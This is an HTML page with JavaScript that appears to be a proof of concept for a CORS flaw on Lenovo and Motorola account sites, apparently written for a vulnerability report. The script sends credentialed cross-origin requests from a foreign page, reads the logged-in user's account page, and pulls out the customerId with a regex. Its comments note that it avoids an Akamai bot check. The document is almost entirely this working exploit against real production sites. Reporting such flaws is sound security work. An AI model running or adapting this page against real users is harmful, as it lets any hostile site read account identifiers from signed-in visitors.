<!DOCTYPE html>
<html lang="zh">
<head><meta charset="utf-8"><title>账号中心 CORS 实测（GET 带凭证 + 提取 customerId）</title></head>
<body>
<pre id="out">运行中…（须在已登录 account.lenovo.com 的浏览器中打开本页）</pre>
<script>
// 申诉版复现 v2：GET-only + 正确提取 customerId（无引号键 customerId: "xxx"）
// 去掉 OPTIONS 探测（避免触发 Akamai 反爬连带 GET 被砍）；只做带凭证 GET，读正文并提取账户字段。
const TARGETS = [
  'https://account.lenovo.com/us/en/account/home.html',
  'https://account.motorola.com/us/en/account/home.html'
];
function findField(body, key){
  // 兼容 "customerId":"xxx" 与 customerId: "xxx"（无引号键）
  let re = new RegExp('"?\\b' + key + '\\b"?\\s*:\\s*"([^"\\\\]*)"', 'i');
  let m = body.match(re);
  return m ? m[1] : null;
}
function ctx(body, key){
  let i = body.indexOf(key);
  return i < 0 ? '(无)' : body.slice(Math.max(0,i-70), i+140).replace(/\s+/g,' ');
}
async function probe(url){
  let s = '=== ' + url + ' ===\n';
  try{
    const r = await fetch(url, {credentials:'include', cache:'no-store'});
    const body = await r.text();
    s += '[GET] status=' + r.status + ' type=' + r.type + ' len=' + body.length + '\n';
    const cid = findField(body, 'customerId');
    if(cid !== null){
      s += '  ★ customerId 命中: "' + cid + '"\n';
      s += '  命中上下文: ' + ctx(body, 'customerId') + '\n';
      if(cid.trim() !== ''){
        s += '  ★★ 跨域读到本人 non-empty customerId —— 已登录用户账户标识被任意站点读取（数据外泄实证）\n';
      } else {
        s += '  （customerId 为空串：本请求未带会话 或 服务端未填充）\n';
      }
    } else {
      s += '  customerId 字段未找到；上下文: ' + ctx(body, 'customerId') + '\n';
    }
    s += '  正文前200字符: ' + body.slice(0,200).replace(/\s+/g,' ') + '\n';
  }catch(e){ s += '[GET] 被拦截: ' + e + '\n'; }
  return s;
}
(async()=>{
  let log = '⚠️ 前提：本页源为外网 HTTPS 域名(Origin≠null) + 浏览器已登录本人 Lenovo ID\n\n';
  for(const u of TARGETS){ log += await probe(u) + '\n'; }
  document.getElementById('out').textContent = log;
  console.log(log);
})();
</script>
</body>
</html>
